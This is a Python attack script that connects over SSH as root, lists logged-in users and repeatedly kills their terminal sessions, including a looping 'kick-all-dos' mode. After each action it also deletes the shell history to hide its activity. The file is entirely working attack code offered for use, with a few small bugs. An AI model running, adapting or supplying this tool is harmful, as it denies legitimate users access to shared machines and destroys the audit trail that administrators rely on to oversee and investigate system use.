#!/bin/python3

"""
Created by: ---
Created on: May 26, 2026
"""

import paramiko
from time import sleep
from sys import argv

# Connecting to the host machine
try:
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(input("Hostname: "), username='root', password=input("Password for root: "))
except Exception as i:
	print("[ %s ]" %i)

def fetchUserList():
	# Fetching the user login list
	
	print("\n[--- Connected user list ---]")
	stdin, stdout, stderr = client.exec_command("w -f | awk 'NR>2 { print $3,$1 }'")
	targets = stdout.read().decode("utf-8").split('\n')
	for target in targets:
		if target != '':
			target = target.split(' ')
			print("[*] User machine IP: %-17s  --> %s" %(target[0], target[1]))
	stdin, stdout, stderr = client.exec_command("history -c && rm ~/.bash_history")
	return [ target.split(' ')[0] for target in targets ]

def kickUser(target):
	""" Kicks a user out """

	if target == '':
		return None	
	stdin, stdout, stderr = client.exec_command("who | grep " + target + " | awk 'NR==1 { print $2 }'")
	stdout = stdout.read().decode("utf-8")
	if stdout == '':
		print("[!] Target (%-15s) offline\n" %target)
	else:
		print("[?] Target found at session - " + stdout)
		stdin, stdout, stderr = client.exec_command("pkill -9 -t " + stdout)
		print("[~] Target (%-15s) cleared - " %target + stdout.read().decode("utf-8"))
		stdin, stdout, stderr = client.exec_command("history -c && rm ~/.bash_history")

def kickAllUsers(mode = 'n'):
	""" Kicks all the users connected """	
	
	target = fetchUserList()
	input("Press enter key to launch attack...")
	if mode == 'n':
		print("\n[~] Launching the attack...")
		for i in target:
			kickUser(i)
	elif mode.lower() =="dos" or mode.lower() == "kad":
		print("\n[~] Launching the kick-all-dos attack mode --- Press <CTRL+C> to EXIT")
		try:
			while True:
				for i in target:
					kickUser(i)
					print("\t---")
					print("[~] Waiting for 10 min\n")
					sleep(600)
		except KeyboardInterrupt:
			print("[!] --- Halting the attack ---")

try:
	if argv[1].lower() == "--kick-all" or argv[1].lower() == "-ka":
		# Kicks all users out --> once
		
		kickAllUsers()
		exit()
	elif argv[1].lower == "--kick-all-dos" or argv[1].lower() == "-kad":
		# Continously kicking all users out
		
		kickAllUsers("dos")
		exit()
	elif argv[1].lower() == "--help" or argv[1].lower() == "-h":
		# Dispalying the help doc for this tool

		print("""
KickUsers

usage:
>>> python3 kickUser.py [argument]

--kick-all, -ka\tFetches all users logged into the machine and kicks them out once
--kick-all-dos, -kad\tFetches all users logged into the machine and continously kicks them out every 10 min

For nomal single user kick attack -> launch without any arguments
		""")
		exit()
except IndexError:
	print("[~] Proceeding with single user mode...")

while True: 
	fetchUserList()
	target = input("Press enter for list refresh | (Y) for attack launch | (X) for exit: ")
	if target.lower() == 'y':
		break
	elif target.lower() == 'x':
		exit()
	else:
		continue

target = input("\nEnter the target process / IP: ")

print("\n[~] Launching attack loop. Refreshes every 5 minutes. Press <CTRL+C> to stop the attack...")
while True:
	kickUser(target)
	sleep(300)

client.close()
